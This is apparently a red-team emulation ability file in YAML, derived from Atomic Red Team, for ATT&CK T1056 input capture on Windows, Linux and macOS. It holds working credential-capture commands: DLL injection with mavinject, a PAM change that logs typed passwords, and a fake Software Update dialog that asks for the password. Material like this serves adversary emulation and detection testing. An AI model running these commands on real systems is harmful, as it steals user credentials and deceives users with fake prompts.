- id: d93ac5b4-6d88-4005-8b50-0505d141ed32
  name: Input Capture
  description: Ability for Input Capture (ATT&CK T1056). Generated from Atomic Red
    Team procedures; review and test safely before use.
  tactic: collection
  technique:
    attack_id: T1056
    name: Input Capture
  platforms:
    windows:
      psh:
        command: 'mavinject $pid /INJECTRUNNING "#{file_name}" Invoke-WebRequest #{server_name}
          -UseBasicParsing'
    linux:
      sh:
        command: if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth
          /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then
          sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk
          sudo touch /tmp/system-auth.bk sudo echo "session required pam_tty_audit.so
          enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session required
          pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
    darwin:
      sh:
        command: osascript -e 'tell app "System Preferences" to activate' -e 'tell
          app "System Preferences" to activate' -e 'tell app "System Preferences"
          to display dialog "Software Update requires that you type your password
          to apply changes." & return & return default answer "" with icon 1 with
          hidden answer with title "Software Update"'
